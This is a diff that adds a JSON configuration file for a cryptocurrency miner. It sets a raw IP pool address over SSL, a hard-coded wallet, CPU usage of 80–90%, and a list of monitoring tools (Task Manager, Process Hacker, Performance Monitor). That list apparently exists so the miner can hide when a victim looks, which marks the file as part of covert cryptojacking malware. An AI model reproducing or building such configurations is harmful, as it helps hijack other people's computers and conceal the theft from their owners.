@@ -1,0 +1,27 @@
+{
+    "enable_cpu": 1,
+    "enable_gpu": 0,
+    "cpu_config": {
+        "mining_url": "81.22.134.105:443",
+        "wallet": "88oKXcNdG4JbiZGiHvPPp6UgJYZqfs3aibEZb3ZwFrwyRUrRwpKR9qJVTvBM3PwNnkeEPn31hMdiTfmDSXaB4N9m99YokTP",
+        "password": "cor",
+        "non_idle_usage": 80,
+        "idle_usage": 90,
+        "wait_time_idle": 1,
+        "use_ssl": 1
+    },
+    "gpu_config": {
+        "mining_url": "",
+        "wallet": "",
+        "password": "",
+        "algo": "kawpow",
+        "fan_speed": 80,
+        "wait_time_idle": 10,
+        "use_ssl": 0
+    },
+    "watched_processes": [
+        "taskmgr.exe",
+        "processhacker.exe",
+        "perfmon.exe"
+    ]
+}
